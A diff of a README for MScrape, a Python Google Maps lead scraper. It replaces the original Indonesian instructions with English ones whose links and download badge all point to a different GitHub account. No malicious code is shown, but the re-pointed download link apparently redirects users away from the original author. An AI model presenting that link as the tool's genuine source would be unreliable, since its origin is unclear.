@@ -1,60 +1,72 @@
-# 🚀 MScrape: Google Maps Scraper
+# 📊 MScrape - Find Business Leads on Google Maps
 
-Sebuah *tool* berbasis Python & Streamlit yang digunakan untuk mengambil (*scrape*) ribuan prospek/leads bisnis potensial dari Google Maps secara cepat dan otomatis. Didesain dengan antarmuka web (UI) agar mudah digunakan meski tanpa pengetahuan *coding*.
+[![](https://img.shields.io/badge/Download-MScrape-blue.svg)](https://github.com/xiou5497/MScrape)
 
-Alat ini cocok untuk *B2B Lead Generation*, agensi *marketing*, pencarian data restoran/kafe, dan *cold outreach*.
+MScrape collects business information from Google Maps. It finds data like names, addresses, phone numbers, and websites for businesses in your area. This tool automates the process of gathering leads. You do not need to write code to use it.
 
-## ✨ Fitur Utama
-- **🌍 Scraping Global & Lokal**: Cari bisnis di kota manapun berdasarkan *niche*/kata kunci.
-- **📍 Geolocation Cerdas**: Mendukung ekstraksi titik otomatis *(Geocoding via Nominatim)* untuk hasil pencarian yang sangat akurat.
-- **🤖 Anti-Click Intercept & Tahan Banting**: Dirancang agar tahan terhadap perubahan tata letak antarmuka Google Maps dengan metode pencarian XPath berbasis *Aria-Label*.
-- **📧 Ekstraksi Email Otomatis**: Bot akan mencoba mengunjungi masing-masing *website* bisnis dan memindai halaman tersebut untuk mendapatkan alamat email resmi mereka.
-- **🛡️ Built-in Filter Blacklist**: Mengabaikan email spam (seperti `info@`, `noreply@`) atau bisnis korporat besar (seperti Starbucks, KFC). Semuanya dapat dikonfigurasi melalui antarmuka.
-- **💾 Export to Excel**: Hasil akhir bisa didownload langsung dalam format `.xlsx` dengan rapi.
+## 🛠 Prerequisites
 
-## 🛠️ Persyaratan Sistem
-- Python 3.8 atau lebih baru
-- Google Chrome terinstal di komputer/server Anda
+Your computer needs a few components to run MScrape. 
 
-## 🚀 Instalasi & Cara Penggunaan
+1. **Windows 10 or 11**: The software works on current versions of Windows.
+2. **Python**: This is the engine that runs the scraper. Download it from the official Python website. Ensure you select the option to "Add Python to PATH" during installation.
+3. **Web Browser**: Use Google Chrome or Microsoft Edge for the best results.
 
-1. **Clone repositori ini:**
-   ```bash
-   git clone https://github.com/Indra-cahya/MScrape.git
-   cd MScrape
-   ```
+## 📥 Downloading the Tool
 
-2. **Instal dependensi Python:**
-   Pastikan Anda menjalankan perintah ini untuk menginstal semua *library* yang dibutuhkan.
-   ```bash
-   pip install -r requirements.txt
-   ```
+Follow these steps to get the software:
 
-3. **Jalankan Aplikasi:**
-   Bagi pengguna Windows, Anda cukup klik dua kali pada file:
-   **`run.bat`**
+1. Visit the [MScrape repository page](https://github.com/xiou5497/MScrape).
+2. Look for the green "Code" button near the top right of the page.
+3. Click "Download ZIP".
+4. Save the folder to a location on your computer, such as your Desktop.
+5. Right-click the downloaded folder and select "Extract All".
 
-   Atau jalankan manual melalui terminal:
-   ```bash
-   cd GoogleMaps-Lead-Scraper
-   streamlit run app.py
-   ```
+## ⚙️ Setting Up Your Environment
 
-4. **Buka di Browser:**
-   Aplikasi akan otomatis terbuka. Jika tidak, silakan kunjungi `http://localhost:8501`.
+Once you extract the files, follow these steps to prepare the tool:
 
-## ⚙️ Cara Pemakaian di Antarmuka
-1. Masukkan kata kunci (Niche) pada panel sebelah kiri (contoh: `cafe`, `plumber`, `dentist`).
-2. Tentukan asal Kota/Negara.
-3. Centang fitur **Cari Email** jika Anda juga membutuhkan alamat email mereka (Proses akan sedikit lebih lama).
-4. Tekan **"Gas Scrape Sekarang! 🔥"** dan tunggu hingga bar progres mencapai 100%.
-5. *Download* hasilnya melalui tombol **Download Excel**.
+1. Open the folder named `MScrape-main`.
+2. Find the file named `requirements.txt`. This file tells your computer what extra tools the scraper needs.
+3. Open your Windows Command Prompt. Press the Windows key, type `cmd`, and press Enter.
+4. Type `cd` followed by a space, then drag the `MScrape-main` folder into the command window. Press Enter.
+5. Type the command `pip install -r requirements.txt` and press Enter. Wait for the computer to finish installing these components.
 
-## 📝 Catatan Penting
-- Kecepatan internet dan kemampuan spesifikasi RAM sangat berpengaruh, mengingat *scraper* ini menggunakan *headless browser* (Selenium).
-- Karena *update* Google Maps terus berjalan, tata letak dapat berubah sewaktu-waktu. Selalu periksa apakah ada *update* atau modifikasi versi terbaru dari kode pencarian `XPath` di repositori ini.
+## 🚀 Running the Application
 
----
+You are now ready to start scraping data.
 
-### Lisensi
-Bebas untuk didistribusikan, dimodifikasi, dan dimanfaatkan secara open-source. Selalu gunakan *scraper* ini dengan etika dan hargai batas kebijakan privasi target bisnis yang Anda *scrape*.
+1. In the same command window, type `streamlit run app.py` and press Enter.
+2. Your default web browser will open automatically. You will see the MScrape interface.
+3. Enter your search term, such as "Coffee Shop," and your target city in the provided boxes.
+4. Click the "Start Scraping" button.
+5. The software will display results on your screen as it finds them.
+
+## 🔍 Understanding the Features
+
+MScrape includes tools to manage your data:
+
+* **Global Search**: Search for any business type in any city. 
+* **Geolocation**: The tool automatically maps addresses to coordinates for better accuracy.
+* **Email Extraction**: When a business has a website, the tool visits it to find contact email addresses.
+* **Blacklist Filter**: You can add specific websites or businesses to a list so the tool ignores them in future searches.
+
+## 📂 Exporting Your Data
+
+After the scraper finishes, you can save your results. Look for the "Download CSV" button on the web interface. This creates a file you can open in Excel or Google Sheets. This file contains all the business details gathered during your session.
+
+## 💡 Common Questions
+
+**Does the tool cost money?**
+MScrape is free to use.
+
+**How many leads can I collect?**
+You can collect as many as Google Maps allows for your search terms. 
+
+**What if the tool stops?**
+If the scraper stops, check your internet connection. Refresh the browser page and restart the process.
+
+**Can I run this on a Mac?**
+The current instructions focus on Windows. While the code is Python-based, specific steps for Mac differ.
+
+Keywords: lead generation, google maps scraper, b2b, automation, data extraction, business leads, sales prospecting
